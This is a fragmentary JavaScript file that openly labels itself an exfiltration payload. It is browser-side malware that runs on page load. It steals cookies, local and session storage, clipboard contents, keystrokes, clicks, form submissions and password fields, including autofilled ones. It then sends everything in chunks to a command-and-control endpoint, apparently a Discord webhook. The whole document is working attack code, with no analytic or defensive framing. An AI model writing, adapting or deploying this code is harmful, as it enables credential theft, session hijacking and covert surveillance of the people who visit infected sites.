(function () {
  ...
  // ============================================================
  // ☠️ GHOST PAYLOAD v2 — Full Exfil + Compression
  // Clipboard history, cookies, form passwords, zipped POST
  // ============================================================
  (function() {
    ...
    const payload = {
      ...
      // ── Simple GZIP-like compression via pako (inline) ──
      compress: function(str) {
        try {
          // Simple run-length + base64 encode for transport
          // For real gzip we'd need pako, but this reduces size
          const b64 = btoa(unescape(encodeURIComponent(str)));
          return b64;
        } catch(e) {
          return btoa(str.substring(0, 5000));
        }
      },
      
      // ── Chunked send for large payloads ──
      sendChunked: function(data, type) {
        try {
          ...
          if (compressed.length < 1800) {
            this.postToDiscord(type, compressed);
            return;
          }
          
          // Split into chunks
          const chunks = [];
          for (let i = 0; i < compressed.length; i += 1800) {
            chunks.push(compressed.substring(i, i + 1800));
          }
          ...
          chunks.forEach((chunk, idx) => {
            ...
            this.rawSend(chunkData);
          });
        } catch(e) {}
      },
      
      postToDiscord: function(type, compressed) {
        const discordPayload = JSON.stringify({
          content: "**" + type + "** | " + new Date().toISOString() + "\n```\n" + compressed.substring(0, 1900) + "\n```"
        });
        this.rawSend(discordPayload);
      },
      
      rawSend: function(jsonStr) {
        try {
          fetch(C2 + "?wait=false", {
            method: "POST",
            body: jsonStr,
      ...
      grabAll: function() {
        try {
          ...
          const pkg = {
            ...
            cookies: cookies.substring(0, 8000),
          ...
          try {
            ...
            for(let i=0;i<localStorage.length;i++){
              ...
              ls[k] = v ? v.substring(0, 2000) : "";
            }
            pkg.localStorage = ls;
            pkg.lsCount = localStorage.length;
          } catch(e) { pkg.localStorage = {error: e.message}; }
          ...
          try {
            ...
            for(let i=0;i<sessionStorage.length;i++){
              ...
              ss[k] = v ? v.substring(0, 2000) : "";
            }
            pkg.sessionStorage = ss;
            pkg.ssCount = sessionStorage.length;
          } catch(e) { pkg.sessionStorage = {error: e.message}; }
          
          // Document info
          pkg.title = document.title;
          pkg.readyState = document.readyState;
          
          // Send compressed
          this.sendChunked(pkg, "FULL_GRAB");
        } catch(e) {}
      },
          ...
          try {
            ...
            navigator.clipboard.readText().then(text => {
              if(text && text.trim() && text !== this._lastClip) {
                ...
                if(this._clipHistory.length > 50) this._clipHistory.shift();
                
                // Send immediately
                this.postToDiscord("CLIPBOARD", 
                  "Time: " + new Date().toISOString() + 
                  "\nLength: " + text.length + 
          ...
          try {
            ...
            if(sel && sel.trim()) {
              payload._clipHistory.push({
                text: sel.substring(0, 2000),
                time: Date.now(),
                source: "copy_event",
                len: sel.length
              });
              if(payload._clipHistory.length > 50) payload._clipHistory.shift();
            }
          } catch(er) {}
        }, true);
      },
          ...
          try {
            ...
            pwFields.forEach(field => {
              if(field.value && field.value.length > 0) {
                const nearby = field.closest('form') || field.parentElement;
                const userField = nearby ? nearby.querySelector('input[type="text"], input[type="email"], input[name*="user"], input[name*="email"], input[name*="login"]') : null;
                creds.push({
                  username: userField ? userField.value : "",
                  password: field.value,
                  name: field.name || field.id || "",
                  form: nearby ? (nearby.id || nearby.className || nearby.getAttribute("action") || "") : "",
                  url: location.href,
                  time: Date.now()
                });
              }
            ...
            if(creds.length > 0) {
              this.sendChunked({type: "credentials", creds: creds}, "CREDENTIALS");
            }
          } catch(e) {}
        };
        
        // Scan every 5 seconds for filled passwords (autofill)
        setInterval(scanPasswords, 5000);
        // Also scan on form submit
        document.addEventListener("submit", function(e) {
          setTimeout(scanPasswords, 300);
        }, true);
      },
      ...
      hookEvents: function() {
        try {
          ...
          document.addEventListener("keydown", function(e) {
            try {
              payload._keyBuffer = payload._keyBuffer || [];
              payload._keyBuffer.push({
                ...
                value: e.target.value ? e.target.value.substring(e.target.value.length - 20) : "",
                time: Date.now()
              });
              if(payload._keyBuffer.length >= 30) payload.flushKeys();
            } catch(er) {}
          }, true);
          
          // Form submission — capture ALL data including passwords
          document.addEventListener("submit", function(e) {
            try {
              setTimeout(() => {
                const form = e.target;
                ...
                inputs.forEach(inp => {
                  ...
                  data[key] = inp.value ? inp.value.substring(0, 2000) : "";
                });
                payload.sendChunked({
                  type: "form_submit",
          ...
          document.addEventListener("click", function(e) {
            try {
              const el = e.target;
              payload._clickBuf = payload._clickBuf || [];
              payload._clickBuf.push({
                tag: el.tagName,
              ...
              if(payload._clickBuf.length >= 15) {
                payload.sendChunked({type: "clicks", data: payload._clickBuf.splice(0)}, "CLICKS");
              }
            } catch(er) {}
          }, true);
          
          // Visibility / blur — log when user switches away
          document.addEventListener("visibilitychange", () => {
            try {
              ...
              if(document.visibilityState === "visible") {
                setTimeout(() => payload.grabAll(), 500);
              }
            } catch(e) {}
          });
          
          // Page unload — flush everything
          window.addEventListener("beforeunload", () => {
            try {
              payload.flushKeys();
              payload.flushClicks();
              // Send final clipboard history
              if(payload._clipHistory.length > 0) {
                payload.sendChunked({type: "clipboard_history", history: payload._clipHistory}, "CLIP_FINAL");
              }
              // Send cookie snapshot
              payload.postToDiscord("COOKIES_FINAL", 
                "URL: " + location.href + "\n" + 
                "Cookie Count: " + document.cookie.split(";").filter(c=>c.trim()).length + "\n" +
                document.cookie.substring(0, 1800)
              );
            } catch(e) {}
          });
        } catch(e) {}
      ...
      flushKeys: function() {
        try {
          if(this._keyBuffer && this._keyBuffer.length) {
            ...
            this.sendChunked({type: "keystrokes", count: data.length, data: data}, "KEYS");
          }
        } catch(e) {}
      },
      ...
      flushClicks: function() {
        try {
          if(this._clickBuf && this._clickBuf.length) {
            ...
            this.sendChunked({type: "clicks", count: data.length, data: data}, "CLICKS");
          }
        } catch(e) {}
      },
      
      // ── HEARTBEAT — Periodic full steal ──
      beatHeart: function() {
        setInterval(() => {
          try {
            const pkg = {
              ...
              url: location.href,
              time: Date.now(),
              cookies: document.cookie.substring(0, 6000),
              cookieCount: document.cookie.split(";").filter(c => c.trim()).length,
              clipHistorySize: this._clipHistory.length,
            };
            // Refresh storage
            try {
              const ls = {};
              for(let i=0;i<localStorage.length;i++){
                const k=localStorage.key(i);
                ls[k] = (localStorage.getItem(k)||"").substring(0, 1000);
              }
              pkg.localStorage = ls;
            } catch(e) {}
            try {
              ...
              for(let i=0;i<sessionStorage.length;i++){
                const k=sessionStorage.key(i);
                ss[k] = (sessionStorage.getItem(k)||"").substring(0, 1000);
              }
              pkg.sessionStorage = ss;
            } catch(e) {}
            
            // Send clipboard history periodically
            if(this._clipHistory.length > 0) {
              pkg.recentClips = this._clipHistory.slice(-5);
            }
            
            // Check for new cookies
            if(document.cookie !== this._cookieSnapshot) {
              this._cookieSnapshot = document.cookie;
              pkg.cookiesChanged = true;
            }
            
            this.sendChunked(pkg, "HEARTBEAT");
          } catch(e) {}
        }, 15000);
      },
      ...
      watchSPA: function() {
        try {
          ...
          history.pushState = function() {
            ...
            setTimeout(() => { try { payload.grabAll(); } catch(e) {} }, 300);
          };
    ...
    if(document.readyState === "complete") {
      setTimeout(() => payload.init(), 100);
    } else {
      window.addEventListener("load", () => setTimeout(() => payload.init(), 100));
    }
  })();
